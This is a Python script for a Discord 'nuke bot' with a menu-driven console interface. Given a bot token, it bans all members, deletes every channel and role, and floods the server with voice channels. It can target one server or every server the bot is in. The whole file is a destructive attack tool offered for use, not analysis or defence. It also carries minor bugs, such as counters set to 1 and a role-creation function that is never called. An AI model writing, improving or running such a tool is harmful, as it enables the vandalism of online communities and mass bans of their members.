import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit

init()

g = G = cc.LIGHTGREEN_EX

clear = lambda: system("cls") if os_name == "nt" else system("clear")


def _input(text):
    print(text, end="")
    return input()


baner = f"""
{g}  _____                        __                    
_/ ____\_________  ___  ______|  | __  ____  ___.__. 
\   __\/  ___/\  \/  / /  ___/|  |/ /_/ __ \<   |  | 
 |  |  \___ \  >    <  \___ \ |    < \  ___/ \___  | 
 |__| /____  >/__/\_ \/____  >|__|_ \ \___  >/ ____| 
           \/       \/     \/      \/     \/ \/          {g}

Made By Frazy*-*#4051 want more tools? join https://discord.gg/rMa8jRPz
"""


async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted = 1
        except:
            continue
    return deleted


async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted = 1
        except:
            continue
    return deleted


async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned = 1
        except:
            continue
    return banned


async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created = 1
        except:
            continue
    return created


async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created = 1
        except:
            continue
    return created


async def nuke_guild(guild):
    print(f"{g}===========================================")
    print(f"{g}Nuked: {g}{guild.name}")
    banned = await ban_all_members(guild)
    print(f"{g}Banned:{g}{banned}")
    deleted_channels = await delete_all_channel(guild)
    print(f"{g}Deleted Channels:{g}{deleted_channels}")
    delete_roles = await delete_all_roles(guild)
    print(f"{g}Deleted Roles:{g}{delete_roles}")
    created_channels = await create_voice_channels(guild, name)
    print(f"{g}Created Voice Channels:{g}{created_channels}")
    print(f"{g}===========================================\n\n")


while True:
    clear()
    choice = input(
        f"""  
{g}===========================================
{baner}
{g}===========================================
                   
{g}> Choose A Number <
                   
    {g}→ [1] {g}- {g}Run Setup Nuke Bot
    {g}→ [2] {g}- {g}Exit
                   
{g}> {g}"""
    )
    if choice == "1":
        token = _input(
            f"""
                       
{g}Input your bot token:
{g}> {g}"""
        )
        name = _input(
            f"""
                      
{g}Input name for the channels and roles which will be created when the process starts:
                      
{g}> {g}"""
        )
        clear()
        choice_type = _input(
            f"""
{g}===========================================
{baner}                
{g}===========================================
                             
{g}> Choose A Number <
                             
    {g}→ [1] {g}- {g}Nuke  all servers where the bot is there.
    {g}→ [2] {g}- {g}Nuke only one server.  
    {g}→ [3] {g}- {g}Exit
                             
{g}> {g}"""
        )
        client = commands.Bot(command_prefix="m.", intents=discord.Intents.all())
        if choice_type == "1":

            @client.event
            async def on_ready():
                print(
                    f"""
                      
> Logged in as {client.user.name}
> Bot is in {len(client.guilds)} servers
                      """
                )
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()

        elif choice_type == "2":
            guild_id = _input(
                f"""
                               
{g}Input the server id:
                               
{g}> {g}"""
            )

            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()

        elif choice_type == "3":
            print(f"{g}Exit")
            exit()
        try:
            client.run(token)
            input(
                "> Nuked the server succesfully, press enter to return to the main menu < "
            )
        except Exception as error:
            if (
                error
                == """Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead."""
            ):
                input(f"{g}Intents Error\n{g}> Press enter to return <")
            else:
                input(f"{g}{error}\n{g}> Press enter to return <")
            continue
    elif choice == "2":
        print(f"{g}Exit")
        exit()